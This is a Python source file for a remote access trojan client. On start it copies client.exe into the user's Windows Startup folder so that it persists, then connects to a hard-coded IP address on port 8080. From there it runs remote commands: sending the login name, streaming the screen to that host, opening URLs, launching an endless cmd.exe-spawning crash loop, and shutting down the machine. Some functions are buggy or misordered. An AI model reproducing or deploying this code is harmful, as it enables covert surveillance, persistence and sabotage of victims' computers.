import socket
import os
import traceback
import shutil
from vidstream import ScreenShareClient
import threading
import time
import webbrowser

ip = "77.250.137.62"
port = 8080
keepgoing = True

try:
    source = os.getcwd() + "\\client.exe"
    print(source)
    username = os.getlogin()
    destination = "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\new.exe"
    shutil.copyfile(source, destination)
except:
    print("nope")



while (keepgoing == True):
    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        address = (ip,port)
        sock.connect(address)
        msg = sock.recv(1024)
        msg = msg.decode()
        while keepgoing == True:
            if msg == "exit":
                exit()
            elif msg == "username":
                username()
            elif msg == "screenshare":
                screenshare()
            elif msg == "website":
                website()
            elif msg == "crash":
                crash()
            elif msg == "shutdown":
                shutdown()
            elif msg == "lock":
                lock()
            elif msg == "restart":
                restart()

    except:
        traceback.print_exc()
        continue

def exit():
    keepgoing = False


def username():
    username = os.getlogin()
    sock.send(username.encode())


def screenshare():
    sock.close()
    sender = ScreenShareClient("77.250.137.62", 8080)
    t = threading.Thread(target=sender.start_stream)
    t.start()
    time.sleep(10)
    sender.stop_stream()


def website():
    website = sock.recv(1024)
    website = website.decode()
    webbrowser.open(website, new=1)


def crash():
    while True:
        os.system("start /B start cmd.exe")
        print("started")


def shutdown():
    os.system("shutdown /s /t 1")


def lock():
    os.system("shutdown /s /l 1")


def restart():
    os.system("shutdown /s /r 1")
